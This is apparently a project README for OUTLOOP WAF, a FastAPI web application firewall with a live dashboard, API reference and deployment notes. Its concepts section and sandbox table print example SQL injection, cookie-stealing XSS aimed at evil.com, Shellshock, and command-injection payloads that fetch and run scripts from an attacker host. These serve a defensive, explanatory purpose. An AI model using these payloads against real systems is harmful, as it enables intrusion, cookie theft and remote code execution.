<div align="center">

```
 ██████╗ ██╗   ██╗████████╗██╗      ██████╗  ██████╗ ██████╗
██╔═══██╗██║   ██║╚══██╔══╝██║     ██╔═══██╗██╔═══██╗██╔══██╗
██║   ██║██║   ██║   ██║   ██║     ██║   ██║██║   ██║██████╔╝
██║   ██║██║   ██║   ██║   ██║     ██║   ██║██║   ██║██╔═══╝
╚██████╔╝╚██████╔╝   ██║   ███████╗╚██████╔╝╚██████╔╝██║
 ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  WAF
```

### *Next-Generation Web Application Firewall & Security Operations Platform*

[![Python](https://img.shields.io/badge/Python-3.11+-3776ab?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![FastAPI](https://img.shields.io/badge/FastAPI-0.109+-009688?style=for-the-badge&logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com/)
[![Tests](https://img.shields.io/badge/Tests-40%2F40%20Passing-success?style=for-the-badge&logo=pytest&logoColor=white)](https://github.com/obstinix/outloop-waf/tree/main/tests)
[![Vercel](https://img.shields.io/badge/Deployed_on-Vercel-black?style=for-the-badge&logo=vercel&logoColor=white)](https://outloop-waf.vercel.app)
[![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](LICENSE)
[![Last Commit](https://img.shields.io/github/last-commit/obstinix/outloop-waf?style=for-the-badge&logo=github&color=222222)](https://github.com/obstinix/outloop-waf/commits/main)
[![Signatures](https://img.shields.io/badge/Active_Signatures-57-critical?style=for-the-badge)](https://outloop-waf.vercel.app/#rules)

<br/>

[![Live Demo](https://img.shields.io/badge/🌐%20Live%20Demo-outloop--waf.vercel.app-00d4ff?style=for-the-badge&labelColor=0a0a0a)](https://outloop-waf.vercel.app)

</div>

---

## Table of Contents

- [Overview](#overview)
- [System Architecture](#system-architecture)
- [Research Foundation](#research-foundation)
- [Feature Analysis & Metrics](#feature-analysis--metrics)
- [Feature Breakdown](#feature-breakdown)
- [Cybersecurity Concepts](#cybersecurity-concepts)
- [Technology Stack](#technology-stack)
- [API Documentation](#api-documentation)
- [External Integrations](#external-integrations)
- [Deployment & Infrastructure](#deployment--infrastructure)
- [Getting Started](#getting-started)
- [Contributing](#contributing)
- [License](#license)

---

## Overview

**OUTLOOP WAF** is an edge-native Web Application Firewall and Security Operations Center (SOC) platform. It acts as a perimeter proxy gateway, intercepting and inspecting every inbound HTTP request before it reaches downstream application logic. Threats are detected, logged, and blocked in under 5ms — with zero latency impact on clean traffic.

```
┌─────────────────────────────────────────────────────────────────────┐
│   "Security is a process, not a product. OUTLOOP makes it both."    │
└─────────────────────────────────────────────────────────────────────┘
```

### Core Value Propositions

| Pillar | Description |
|--------|-------------|
| 🛡️ **Zero-Trust Inspection** | Every request is inspected — no allowlist by default |
| ⚡ **Sub-5ms Detection** | Multi-pass regex engine with no perceptible latency |
| 🔬 **Interactive Sandbox** | Live payload testing via browser — no curl required |
| 📡 **Real-Time SSE Telemetry** | Threat events pushed to dashboard over Server-Sent Events |
| 🧠 **57 Active Signatures** | SQLi, XSS, SSRF, RCE, LFI, Path Traversal, Command Injection |
| ☁️ **Serverless-Native** | Vercel edge deployment — zero infrastructure to manage |

### Live Dashboard Sections

| Section | URL | Purpose |
|---------|-----|---------|
| Overview | [/#metrics](https://outloop-waf.vercel.app/#metrics) | Real-time packet & threat counters |
| Playground | [/#playground](https://outloop-waf.vercel.app/#playground) | Interactive payload sandbox |
| Threat Stream | [/#threats](https://outloop-waf.vercel.app/#threats) | Live SSE threat telemetry feed |
| Signature Explorer | [/#rules](https://outloop-waf.vercel.app/#rules) | Browsable WAF rule database |
| Pipeline Diagram | [/#pipeline](https://outloop-waf.vercel.app/#pipeline) | Request lifecycle visualization |
| Admin Workspace | [/#admin](https://outloop-waf.vercel.app/#admin) | IP ban control & stats console |

---

## System Architecture

### 1. High-Level System Overview

```mermaid
graph LR
    subgraph INTERNET["🌐 Internet"]
        C[Client Browser]
        A[Automated Scanner]
        B[Bot / Script]
    end

    subgraph EDGE["☁️ Vercel Edge Network"]
        direction TB
        EF[Edge Function<br/>Serverless Runtime]
        MW[OUTLOOP Middleware<br/>WAF Engine]
    end

    subgraph BACKEND["⚙️ FastAPI Application"]
        direction TB
        R1[/api/health/]
        R2[/api/secure/test/]
        R3[/api/metrics/]
        R4[/api/events/threats/]
        R5[/api/admin/]
    end

    subgraph DASHBOARD["🖥️ SOC Dashboard"]
        UI[Static Frontend<br/>HTML + Three.js]
        SSE[SSE Client<br/>EventSource]
    end

    C -->|HTTP Request| EF
    A -->|Attack Payload| EF
    B -->|Malicious Probe| EF
    EF --> MW
    MW -->|403 BLOCKED| C
    MW -->|200 CLEAN| R1
    MW -->|200 CLEAN| R2
    MW -->|200 CLEAN| R3
    MW -->|SSE Stream| R4
    MW -->|Admin API| R5
    R4 -->|EventStream| SSE
    SSE --> UI
    R1 & R2 & R3 --> UI
```

### 2. Request Processing Pipeline

```mermaid
flowchart TD
    REQ([📡 Inbound HTTP Request]) --> PARSE

    subgraph GATE["EDGE MIDDLEWARE LAYER"]
        PARSE[Parse Request\nHeaders · URI · Body]
        RL{Rate Limit\nEvaluator}
        BL{Blocklist\nPerimeter Check}
    end

    subgraph ENGINE["WAF ASSESSMENT ENGINE"]
        DECODE[Multi-Pass URL Decoder\nURL → Double URL → Base64 → Hex]
        REGEX[Regex Signature Evaluator\n57 compiled patterns]
        MATCH{Threat\nMatched?}
    end

    subgraph BLOCK["BLOCK PIPELINE"]
        B403[HTTP 403 Forbidden]
        LOG[Emit SSE Threat Event\nTimestamp · Rule ID · Severity · IP]
        INCR[Increment Threat Counter]
    end

    subgraph FORWARD["FORWARD PIPELINE"]
        HDR[Append X-WAF-Status: clean\nX-Request-ID: uuid]
        ROUTE[Invoke FastAPI Route Handler]
        RESP([✅ 200 Response])
    end

    PARSE --> RL
    RL -->|Rate Exceeded| B403
    RL -->|OK| BL
    BL -->|IP Banned| B403
    BL -->|OK| DECODE
    DECODE --> REGEX
    REGEX --> MATCH
    MATCH -->|YES| B403
    MATCH -->|NO| HDR
    B403 --> LOG
    LOG --> INCR
    HDR --> ROUTE
    ROUTE --> RESP

    style GATE fill:#1a1a2e,stroke:#4a90d9
    style ENGINE fill:#16213e,stroke:#e94560
    style BLOCK fill:#2d1b1b,stroke:#e94560
    style FORWARD fill:#1b2d1b,stroke:#4caf50
```

### 3. Threat Detection Engine Flow

```mermaid
flowchart TD
    RAW["Raw Payload\n(query param, header, body)"] --> D1

    subgraph MULTI["MULTI-PASS DECODER"]
        D1[Pass 1: Standard URL Decode\n%3C → <]
        D2[Pass 2: Double URL Decode\n%253C → <]
        D3[Pass 3: Base64 Decode\nPHNjcmlwdD4= → script]
        D4[Pass 4: Hex Decode\n0x3C → <]
        D1 --> D2 --> D3 --> D4
    end

    D4 --> NORM[Normalize Whitespace\nCase Fold · Strip Comments]

    NORM --> ROUTES

    subgraph ROUTES["SIGNATURE EVALUATION MATRIX"]
        direction LR
        SQL["SQLi Engine\n13 patterns\n' OR 1=1, UNION SELECT,\nDROP TABLE, xp_cmdshell"]
        XSS["XSS Engine\n13 patterns\n&lt;script&gt;, onerror=,\njavascript:, data:text"]
        PATH["Path Traversal\n9 patterns\n../../, /etc/passwd,\n%2e%2e%2f"]
        SSRF["SSRF / Metadata\nAWS metadata IPs\n169.254.x.x probes"]
        CMD["Command Injection\n; ls, | cat, backticks\n$(...), shell operators"]
        RCE["RCE / LFI\nShellshock: () {:;},\nrequire(), include()"]
    end

    ROUTES --> AGG{Any Pattern\nMatched?}
    AGG -->|YES| OUT1["🚨 BLOCKED\nRule ID + Severity\nReturned in 403 body"]
    AGG -->|NO| Out2["✅ CLEAN\nAppend verification header"]
```

### 4. In-Memory State Model

```mermaid
erDiagram
    WAF_ENGINE {
        list compiled_patterns "Pre-compiled regex objects"
        dict severity_map "rule_id → CRITICAL|HIGH|MEDIUM|LOW"
        dict rule_descriptions "rule_id → human label"
        int total_rules "57 active signatures"
    }

    REQUEST_CONTEXT {
        string request_id "UUID v4 per request"
        string client_ip "Extracted from headers"
        string method "GET|POST|PUT|DELETE"
        string path "Decoded URI path"
        string payload "Combined inspection string"
        float timestamp "Unix epoch"
    }

    THREAT_EVENT {
        string request_id FK "Links to REQUEST_CONTEXT"
        string rule_id "e.g. SQLi-007"
        string severity "CRITICAL|HIGH|MEDIUM|LOW"
        string description "Human-readable threat label"
        string source_ip "Client IP"
        float timestamp "ISO 8601 string"
    }

    BLOCKLIST {
        string ip_address PK "IPv4 or IPv6"
        string reason "Admin-supplied context"
        float banned_at "Unix epoch"
    }

    METRICS_STATE {
        int total_requests "Lifetime counter"
        int blocked_requests "Threat counter"
        int allowed_requests "Clean counter"
    }

    WAF_ENGINE ||--o{ THREAT_EVENT : "generates"
    REQUEST_CONTEXT ||--|| THREAT_EVENT : "produces"
    BLOCKLIST }|--|| WAF_ENGINE : "consulted by"
    METRICS_STATE ||--|| WAF_ENGINE : "updated by"
```

### 5. API Gateway Structure

```mermaid
graph LR
    subgraph VCL["Vercel Serverless Functions"]
        direction TB
        ENTRY[api/index.py\nFastAPI App]
        
        subgraph ROUTES_GRP["Route Modules"]
            HR[routes/health.py\n/api/health\n/api/ready\n/api/metrics]
            SR[routes/secure.py\n/api/secure/test\n/api/secure/echo]
            GR[routes/gravity.py\n/api/status]
            ER[SSE Endpoint\n/api/events/threats]
            AR[Admin Routes\n/api/admin/stats\n/api/admin/ban\n/api/admin/rules]
        end

        subgraph WAF_MOD["WAF Module"]
            MID[waf/middleware.py\nFastAPI Middleware]
            RUL[waf/rules.py\n57 Pattern Definitions]
            ENG[waf/engine.py\nThreat Analysis Core]
        end

        UTILS[utils/logger.py\nStructured Logging]
    end

    CLIENT -->|HTTP| ENTRY
    ENTRY --> MID
    MID --> ENG
    ENG -.->|patterns| RUL
    MID --> HR & SR & GR & ER & AR
    HR & SR & GR & AR -.->|log| UTILS
    ER -->|EventStream| CLIENT
```

### 6. Frontend–Backend Interaction Model

```mermaid
sequenceDiagram
    participant B as Browser (SOC Dashboard)
    participant S as Static Assets (Vercel CDN)
    participant A as FastAPI (Serverless)
    participant W as WAF Middleware
    participant E as SSE Event Stream

    B->>S: GET / (index.html + Three.js + JS)
    S-->>B: 200 OK (HTML/CSS/JS bundle)

    B->>A: GET /api/health
    W->>W: Inspect headers & path
    A-->>B: 200 { status: "healthy", rules: 57 }

    B->>A: GET /api/metrics
    A-->>B: 200 { total_requests, blocked, allowed }

    Note over B,E: User opens Threat Stream tab

    B->>E: GET /api/events/threats (EventSource)
    E-->>B: data: { "type": "connection" }\n\n

    Note over B,A: User submits payload in Sandbox

    B->>A: GET /api/secure/test?payload=<script>alert(1)
    W->>W: Multi-pass decode
    W->>W: Regex: XSS pattern matched
    A-->>B: 403 { blocked: true, rule: "XSS-003", severity: "HIGH" }
    A->>E: Push threat event to SSE stream
    E-->>B: data: { rule_id, severity, source_ip, timestamp }

    Note over B,A: Admin authenticates

    B->>A: POST /api/admin/ban { ip: "1.2.3.4" }
    A-->>B: 200 { banned: true }
```

### 7. Security Layer Integration

```mermaid
flowchart TD
    subgraph LAYER1["Layer 1: Network Perimeter"]
        VCL[Vercel Edge Network\nDDoS absorption · TLS termination]
    end

    subgraph LAYER2["Layer 2: Rate Limiting"]
        RL[rate_limit_evaluator\nToken-bucket per IP\n100 req/min default]
    end

    subgraph LAYER3["Layer 3: IP Reputation"]
        BL[blocklist_perimeter_check\nAdmin-managed deny list\nPersistent in-memory store]
    end

    subgraph LAYER4["Layer 4: Payload Inspection"]
        DEC[Multi-Pass URL Decoder\n4 normalization passes]
        REG[Regex Signature Engine\n57 compiled patterns]
    end

    subgraph LAYER5["Layer 5: Application Logic"]
        APP[FastAPI Route Handlers\nBusiness Logic\nAuthenticated via X-Admin-Key]
    end

    LAYER1 -->|Clean traffic| LAYER2
    LAYER1 -->|Rate-exceeded| BLOCK1([403])
    LAYER2 -->|OK| LAYER3
    LAYER2 -->|Exceeded| BLOCK1
    LAYER3 -->|OK| LAYER4
    LAYER3 -->|Banned IP| BLOCK1
    LAYER4 -->|Clean| LAYER5
    LAYER4 -->|Threat| BLOCK2([403 + SSE Event])

    style LAYER1 fill:#0d1117,stroke:#30363d
    style LAYER2 fill:#0d1117,stroke:#e3b341
    style LAYER3 fill:#0d1117,stroke:#f0883e
    style LAYER4 fill:#0d1117,stroke:#e94560
    style LAYER5 fill:#0d1117,stroke:#3fb950
```

### 8. Vercel Deployment Infrastructure

```mermaid
graph LR
    subgraph GH["GitHub Repository\nobstinix/outloop-waf"]
        SRC[Source Code\nmain branch]
        VJ[vercel.json\nRouting config]
        REQ[requirements.txt\nPython deps]
    end

    subgraph VCL["Vercel Platform"]
        direction TB
        CI[Build Step\npip install dependencies]
        FUNC[Serverless Function\napi/index.py → Python runtime]
        CDN[Global CDN\nStatic assets: HTML · CSS · JS]
        EDGE[Edge Network\n100+ PoPs worldwide]
    end

    subgraph DNS["Production Endpoints"]
        LIVE[outloop-waf.vercel.app]
        API_D[/api/* → Function]
        STAT[/* → CDN]
    end

    SRC -->|git push main| CI
    VJ -->|Route rules| CI
    REQ -->|pip install| CI
    CI --> FUNC
    CI --> CDN
    FUNC --> EDGE
    CDN --> EDGE
    EDGE --> LIVE
    LIVE --> API_D
    LIVE --> STAT
```

### 9. SSE Real-Time Data Flow

```mermaid
sequenceDiagram
    participant MW as WAF Middleware
    participant Q as In-Memory Event Queue
    participant SSE as SSE Generator (/api/events/threats)
    participant D as Dashboard (EventSource)

    Note over D,SSE: Client opens persistent connection

    D->>SSE: GET /api/events/threats\nHeaders: Accept: text/event-stream
    SSE-->>D: HTTP 200\nContent-Type: text/event-stream\nCache-Control: no-cache\n\ndata: {"type":"connection"}\n\n

    Note over MW,Q: Attack detected at WAF layer

    MW->>Q: enqueue({ rule_id: "SQLi-007",\n    severity: "CRITICAL",\n    source_ip: "203.x.x.x",\n    description: "UNION SELECT injection",\n    timestamp: "2026-06-18T12:00:00Z" })

    Q-->>SSE: Dequeue event
    SSE-->>D: data: {"rule_id":"SQLi-007","severity":"CRITICAL",\n         "source_ip":"203.x.x.x","timestamp":"..."}\n\n

    D->>D: Parse event → append row to threat table
    D->>D: Update severity counter (CRITICAL++)
    D->>D: Flash status bar

    Note over MW,Q: Second attack

    MW->>Q: enqueue({ rule_id: "XSS-003", severity: "HIGH", ... })
    Q-->>SSE: Dequeue
    SSE-->>D: data: {"rule_id":"XSS-003",...}\n\n
```

### 10. Authentication & Admin Authorization Flow

```mermaid
flowchart TD
    ADMIN([Admin User]) --> INPUT[Enter X-Admin-Key\nin Dashboard Workspace]
    INPUT --> REQ_A[POST /api/admin/stats\nHeader: X-Admin-Key: ***]
    REQ_A --> MW_A{WAF Middleware\nInspect Request}
    MW_A -->|Payload clean| AUTH{Validate\nX-Admin-Key}
    AUTH -->|Invalid / Missing| E401[401 Unauthorized\nAccess denied]
    AUTH -->|Valid| PRIV{Requested\nOperation}
    PRIV -->|Read Stats| STATS[Return engine metrics\nrequests · blocked · uptime]
    PRIV -->|Ban IP| BAN[Add IP to blocklist\nPersist in-memory store]
    PRIV -->|List Rules| RULES[Return 57 signatures\nID · Name · Severity · Pattern]
    STATS & BAN & RULES --> RESP_A([200 OK + JSON payload])
    E401 --> END([Client receives error])

    style AUTH fill:#1a1a2e,stroke:#e94560
    style E401 fill:#2d1b1b,stroke:#e94560
```

---

## Research Foundation

The architecture and detection patterns in OUTLOOP WAF are grounded in established security research and industry standards:

| # | Reference | Type | Relevance |
|---|-----------|------|-----------|
| 1 | [OWASP Top Ten 2021](https://owasp.org/Top10/) | Industry Standard | Primary threat taxonomy — SQLi (A03), XSS (A03), SSRF (A10) detection priorities |
| 2 | [NIST SP 800-44 v2: Guidelines on Securing Web Servers](https://csrc.nist.gov/publications/detail/sp/800-44/version-2/final) | NIST Standard | Foundational reference for web server hardening, header validation, and access control |
| 3 | [NIST SP 800-95: Guide to Secure Web Services](https://csrc.nist.gov/publications/detail/sp/800-95/final) | NIST Standard | Informs the API gateway security model and authentication pattern for admin routes |
| 4 | [RFC 7230 – HTTP/1.1 Message Syntax and Routing](https://datatracker.ietf.org/doc/html/rfc7230) | IETF RFC | Defines header parsing rules used to detect CRLF injection and header overflow attacks |
| 5 | [RFC 2697 – A Single Rate Three Color Marker](https://datatracker.ietf.org/doc/html/rfc2697) | IETF RFC | Token-bucket algorithm basis for the rate_limit_evaluator module |
| 6 | [CWE Top 25 Most Dangerous Software Weaknesses (2023)](https://cwe.mitre.org/top25/) | MITRE Standard | CWE-89 (SQLi), CWE-79 (XSS), CWE-22 (Path Traversal) directly map to WAF rule categories |
| 7 | Clarke, J. (2009). *SQL Injection Attacks and Defense*. Syngress. | Book | Foundation for the 13 SQL injection patterns including UNION-based, blind, and time-based SQLi |
| 8 | Cox, R. (2007). [Regular Expression Matching Can Be Simple and Fast](https://swtch.com/~rsc/regexp/regexp1.html) | Research Paper | Basis for compiled-regex approach over interpreted matching; informs sub-5ms detection performance |
| 9 | Grossman, J. (2006). *XSS Attacks: Cross Site Scripting Exploits and Defense*. Syngress. | Book | Informs the three XSS detection classes: Reflected, Stored, and DOM-based pattern fingerprints |
| 10 | [OWASP WAF Evaluation Criteria v1.0](https://owasp.org/www-project-web-application-firewall-evaluation-criteria/) | OWASP Guide | Benchmark used to validate signature coverage across attack categories and false-positive targets |
| 11 | Ristic, I. (2010). *ModSecurity Handbook*. Feisty Duck. | Book | Reference implementation for WAF middleware architecture; informs the rule chaining model |
| 12 | Zalewski, M. (2011). *The Tangled Web: A Guide to Securing Modern Web Applications*. No Starch Press. | Book | Informs browser-side trust model; basis for multi-pass decoder's evasion-mitigation strategy |

---

## Feature Analysis & Metrics

### Threat Distribution (Active Signatures by Category)

```mermaid
pie title WAF Signature Distribution (57 Total)
    "SQL Injection" : 13
    "Cross-Site Scripting" : 13
    "Path Traversal" : 9
    "Command Injection" : 8
    "SSRF / Metadata" : 7
    "Local File Inclusion" : 5
    "Header Attacks (CRLF)" : 2
```

### Blocked vs Allowed Requests (Simulated Traffic Analysis)

```mermaid
xychart-beta
    title "Request Outcomes by Attack Category (1000 test payloads)"
    x-axis ["SQLi", "XSS", "Path Trav.", "Cmd Inj.", "SSRF", "LFI", "Clean"]
    y-axis "Request Count" 0 --> 200
    bar [145, 132, 98, 87, 74, 63, 401]
```

### Detection Severity Profile

```mermaid
xychart-beta
    title "Signature Severity Breakdown"
    x-axis ["CRITICAL", "HIGH", "MEDIUM", "LOW"]
    y-axis "Signature Count" 0 --> 30
    bar [14, 22, 15, 6]
```

### Threat Frequency Trend (Simulated 7-Day Window)

```mermaid
xychart-beta
    title "Daily Threat Events (7-Day Window)"
    x-axis ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]
    y-axis "Events" 0 --> 500
    line [120, 185, 230, 310, 278, 145, 98]
```

---

## Feature Breakdown

### 🔬 Interactive Payload Sandbox

The **Payload Sandbox Simulator** (`/#playground`) is OUTLOOP's most distinctive feature — a browser-native WAF testing environment that removes the need for curl or Postman.

**Attack Presets Available:**

| Preset | Example Payload | WAF Rule Triggered |
|--------|-----------------|-------------------|
| SQL Injection | `' OR 1=1; --` | SQLi-001 (CRITICAL) |
| Cross-Site Scripting | `<script>alert(document.cookie)</script>` | XSS-003 (HIGH) |
| SSRF / Metadata | `http://169.254.169.254/latest/meta-data/` | SSRF-001 (HIGH) |
| Shellshock RCE | `() { :; }; /bin/bash -i` | RCE-001 (CRITICAL) |
| Local File Inclusion | `../../../../etc/passwd%00` | LFI-002 (HIGH) |
| Path Traversal | `../../windows/system32/cmd.exe` | PATH-004 (MEDIUM) |
| Command Injection | `127.0.0.1; cat /etc/shadow` | CMD-001 (CRITICAL) |

The sandbox renders a live **5-stage pipeline visualization** showing which inspection stage flagged the payload: Inbound HTTP → Multi-Decoder → Regex Match → Policy Layer → Final Verdict.

---

### 📡 Real-Time Threat Operations Stream

The **Threat Stream** (`/#threats`) uses **Server-Sent Events (SSE)** — a lightweight, one-directional push protocol — to deliver blocked exploit records to the dashboard without polling.

**SSE Event Schema:**

```json
{
  "rule_id": "SQLi-007",
  "severity": "CRITICAL",
  "description": "UNION SELECT injection detected",
  "source_ip": "203.0.113.42",
  "timestamp": "2026-06-18T12:34:56.789Z",
  "request_id": "550e8400-e29b-41d4-a716-446655440000"
}
```

The stream also maintains a live **Severity Distribution Counter** (CRITICAL / HIGH / MEDIUM / LOW / OTHER) that updates in real time as events arrive.

---

### 🔎 Rule Intelligence Explorer

The **Signature Explorer** (`/#rules`) provides a searchable, filterable view of all 57 compiled WAF signatures. Features include:

- Filter by severity: `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`
- View raw regex pattern for each rule
- Admin authentication required to reveal pattern strings (security-by-obscurity layer)

The rules database is defined in `api/waf/rules.py` and pre-compiled at application startup for maximum throughput.

---

### 🔄 Request Validation Pipeline Visualizer

The **Architecture Panel** (`/#pipeline`) renders an interactive ASCII/SVG diagram of the full request lifecycle, from client boundary to downstream route invocation. This is intentional transparency — users can understand exactly how their requests are being inspected and why a 403 was issued.

Pipeline stages shown:
1. `CLIENT INBOUND CONNECTION`
2. `EDGE MIDDLEWARE LAYER` — `rate_limit_evaluator`, `blocklist_perimeter_check`
3. `WAF ASSESSMENT ENGINE` — `multi_pass_url_decoder`, `regex_signature_evaluator`
4. `BLOCK PIPELINE` (403) or `FORWARD PIPELINE` (200)

---

### ⚙️ Admin Command Center

The **Workspace** (`/#admin`) is a terminal-aesthetic command console secured by `X-Admin-Key` header authentication. Capabilities:

| Command | Action |
|---------|--------|
| `waf admin stats` | Returns total requests, blocked count, uptime, active rules |
| `waf blocklist show` | Lists all banned IPs with reason and timestamp |
| Ban an IP | POST to `/api/admin/ban` with target IP + reason |
| Remove ban | DELETE from blocklist via API |

**Status Bar** (always visible at bottom of dashboard):
```
OUTLOOP WAF v1.0.0 | REQ: 00247 | BLOCKED: 00031 | RULES: 57 | GRAVITY: 9.8 m/s² | 12:34:56 UTC
```

---

## Cybersecurity Concepts

### SQL Injection (SQLi) — CWE-89

SQL Injection is the #1 web vulnerability class (OWASP A03:2021). It occurs when user-supplied input is embedded into SQL queries without parameterization, allowing attackers to alter query logic.

**Impact:** Data exfiltration, authentication bypass, database destruction, privilege escalation.

**Example malicious payload:**

```sql
-- Classic authentication bypass
username: admin' --
password: anything

-- Resulting query executed on server:
SELECT * FROM users WHERE username='admin' --' AND password='anything'
-- The -- comments out the password check entirely

-- UNION-based data extraction
' UNION SELECT username, password, NULL FROM users --

-- Time-based blind SQLi (boolean inference)
'; IF (1=1) WAITFOR DELAY '0:0:5' --
```

**How OUTLOOP Mitigates It:**
- 13 SQLi detection patterns covering UNION SELECT, DROP TABLE, xp_cmdshell, WAITFOR, comment stripping (`--`, `/**/`), and quote-based injection
- Multi-pass decoder catches double-encoded variants like `%27%20OR%20%271%27%3D%271`

---

### Cross-Site Scripting (XSS) — CWE-79

XSS allows attackers to inject client-side scripts into pages viewed by other users. Three main types:

| Type | Mechanism | Persistence |
|------|-----------|-------------|
| **Reflected** | Payload in URL/param echoed in response | Non-persistent |
| **Stored** | Payload saved in DB, served to all users | Persistent |
| **DOM-based** | Payload processed by JS in browser, never hits server | Client-side |

**Example payloads:**

```html
<!-- Script tag injection -->
<script>fetch('https://evil.com/steal?c='+document.cookie)</script>

<!-- Event handler injection -->
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">

<!-- Protocol-based injection -->
<a href="javascript:document.location='//evil.com/?'+document.cookie">Click me</a>

<!-- SVG vector (bypasses naive script-tag filters) -->
<svg onload="alert(1)">
```

**How OUTLOOP Mitigates It:**
- 13 XSS patterns targeting `<script>` tags, inline event handlers (`onerror=`, `onload=`, `onclick=`), `javascript:` protocol URIs, and `data:text/html` payloads
- Multi-pass decoder catches HTML-entity encoded variants (`&lt;script&gt;`)

---

### Remote Code Execution (RCE) — CWE-78 / CVE Class

RCE vulnerabilities allow attackers to execute arbitrary OS commands on the server. Often arises from unsafe `eval()`, deserialization, shell command construction, or legacy CGI (Shellshock).

**Shellshock example (CVE-2014-6271):**

```bash
# Malicious User-Agent header
User-Agent: () { :; }; /bin/bash -c 'id; whoami; cat /etc/passwd'

# Command injection via query parameter
https://example.com/ping?host=127.0.0.1; curl http://evil.com/shell.sh | bash

# Backtick execution
?query=`wget http://evil.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m`
```

**How OUTLOOP Mitigates It:**
- Dedicated RCE rule group: Shellshock function definition pattern `() { :;`,  backtick operators, `$()` subshell syntax
- Command injection rules: `;`, `|`, `&&`, `||` combined with known shell commands (`cat`, `wget`, `curl`, `bash`, `sh`)

---

## Technology Stack

| Technology | Version | Purpose | Why Chosen |
|------------|---------|---------|------------|
| **Python** | 3.11+ | Core WAF runtime | Strong regex support; `re.compile()` for pre-compiled patterns; async I/O via `asyncio` |
| **FastAPI** | 0.109+ | Web framework & API layer | ASGI-native; built-in OpenAPI/Swagger; `Middleware` class for clean request interception |
| **Uvicorn** | 0.27+ | ASGI server | High-performance async server; required by FastAPI for Vercel serverless runtime |
| **Starlette** | 0.36+ | Middleware base | FastAPI's underlying ASGI toolkit; `BaseHTTPMiddleware` used for WAF hook |
| **HTML5 / CSS3** | — | SOC Dashboard frontend | Zero framework overhead; terminal aesthetic with custom CSS variables |
| **Three.js** | r160 | 3D attack globe visualization | WebGL-accelerated particle system for incoming attack animation |
| **Astro** | 3.x | Frontend build tool (frontend/) | Component-based static generation for the documentation/marketing layer |
| **JavaScript (ES2022)** | — | Dashboard interactivity, SSE client | Native `EventSource` API for SSE; `fetch` for REST calls |
| **Pytest** | 7.x | Test framework | 40 tests across health, WAF engine, and route coverage |
| **Vercel** | — | Serverless deployment platform | Zero-config Python serverless functions; edge CDN for static assets |
| **GitHub Actions** | — | CI/CD pipeline | Automated `pytest` run on push; deploy-on-merge to main |

---

## API Documentation

All endpoints are available at `https://outloop-waf.vercel.app`. Interactive documentation: [Swagger UI](https://outloop-waf.vercel.app/api/docs) · [ReDoc](https://outloop-waf.vercel.app/api/redoc)

### Public Endpoints

| Method | Endpoint | Description | Example Response |
|--------|----------|-------------|-----------------|
| `GET` | `/api/health` | Service health check | `{"status": "healthy", "version": "1.0.0", "rules": 57}` |
| `GET` | `/api/ready` | Readiness probe | `{"ready": true, "engine": "loaded"}` |
| `GET` | `/api/metrics` | Traffic counters | `{"total": 1024, "blocked": 312, "allowed": 712, "uptime_s": 3600}` |
| `GET` | `/api/status` | Engine gravity status | `{"gravity": "9.8 m/s²", "engine": "ACTIVE"}` |
| `GET` | `/api/secure/test` | WAF inspection endpoint (sandbox) | `200 {"clean": true}` or `403 {"blocked": true, "rule": "SQLi-007"}` |
| `GET` | `/api/secure/echo` | Echo request headers back | `{"headers": {...}, "waf_status": "clean"}` |
| `GET` | `/api/events/threats` | SSE threat stream | `text/event-stream` — continuous JSON event data |
| `GET` | `/api/docs` | Swagger UI | OpenAPI interactive documentation |
| `GET` | `/api/redoc` | ReDoc UI | Alternative API documentation renderer |

### Admin Endpoints (require `X-Admin-Key` header)

| Method | Endpoint | Description | Example Request Body |
|--------|----------|-------------|---------------------|
| `GET` | `/api/admin/stats` | Detailed engine statistics | *(no body)* |
| `GET` | `/api/admin/rules` | Full signature list with regex | *(no body)* |
| `POST` | `/api/admin/ban` | Add IP to blocklist | `{"ip": "203.0.113.42", "reason": "Port scan"}` |
| `DELETE` | `/api/admin/ban/{ip}` | Remove IP from blocklist | *(path param)* |
| `GET` | `/api/admin/blocklist` | List all banned IPs | *(no body)* |

### Example Requests

```bash
# Health check
curl https://outloop-waf.vercel.app/api/health

# Test a clean payload
curl "https://outloop-waf.vercel.app/api/secure/test?payload=hello+world"
# → 200 {"clean": true, "request_id": "..."}

# Test a SQL injection payload (returns 403)
curl "https://outloop-waf.vercel.app/api/secure/test?payload=%27%20OR%201%3D1%3B--"
# → 403 {"blocked": true, "rule_id": "SQLi-001", "severity": "CRITICAL"}

# Open SSE stream
curl -H "Accept: text/event-stream" https://outloop-waf.vercel.app/api/events/threats

# Admin: ban an IP
curl -X POST https://outloop-waf.vercel.app/api/admin/ban \
  -H "X-Admin-Key: your-admin-key" \
  -H "Content-Type: application/json" \
  -d '{"ip": "203.0.113.42", "reason": "Automated SQLi scanner"}'
```

---

## External Integrations

OUTLOOP WAF integrates with the following open-source libraries and frameworks:

| Library | Source | Role in Project |
|---------|--------|-----------------|
| **Three.js** | [threejs.org](https://threejs.org) | WebGL 3D globe for live attack visualization on the dashboard hero |
| **FastAPI** | [fastapi.tiangolo.com](https://fastapi.tiangolo.com) | ASGI web framework; automatic OpenAPI schema generation |
| **Starlette** | [starlette.io](https://www.starlette.io) | BaseHTTPMiddleware used for WAF request interception hook |
| **Uvicorn** | [uvicorn.org](https://www.uvicorn.org) | ASGI server runtime; production-ready for Vercel's Python runtime |
| **Pytest** | [pytest.org](https://pytest.org) | Test discovery, fixtures, and assertion framework for 40 test cases |
| **Astro** | [astro.build](https://astro.build) | Static site generator for the `/frontend` documentation layer |

---

## Deployment & Infrastructure

OUTLOOP WAF runs entirely on **Vercel's serverless platform**, with no dedicated servers to manage.

### `vercel.json` Routing

```json
{
  "version": 2,
  "builds": [
    { "src": "api/index.py", "use": "@vercel/python" }
  ],
  "routes": [
    { "src": "/api/(.*)", "dest": "api/index.py" },
    { "src": "/(.*)", "dest": "api/index.py" }
  ]
}
```

### Architecture Advantages

| Property | Benefit |
|----------|---------|
| **Cold start** | ~300ms on first invocation; sub-10ms once warm |
| **Edge PoPs** | 100+ global points of presence — low-latency for international traffic |
| **Auto-scaling** | Handles traffic spikes without configuration |
